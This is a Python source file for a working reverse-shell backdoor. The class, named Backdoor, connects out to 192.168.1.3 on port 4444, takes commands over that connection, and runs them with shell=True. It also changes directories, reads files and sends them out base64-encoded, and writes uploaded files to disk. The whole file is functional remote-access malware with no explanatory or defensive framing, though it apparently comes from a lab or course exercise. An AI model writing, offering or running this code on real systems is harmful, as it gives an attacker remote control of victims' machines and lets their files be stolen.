import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-] error during command execution"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recv(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Uploaded successfully"


    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return "[+] Change working directory to " + path
        except WindowsError:
            return "[-] No such directory or file"


    def run(self):
        global command_result
        while True:
            try:
                # command = self.connection.recv(1024)
                command = self.reliable_recv()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
                # self.connection.send(command_result)

            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(command_result)


mybackdoor = Backdoor("192.168.1.3", 4444)
mybackdoor.run()
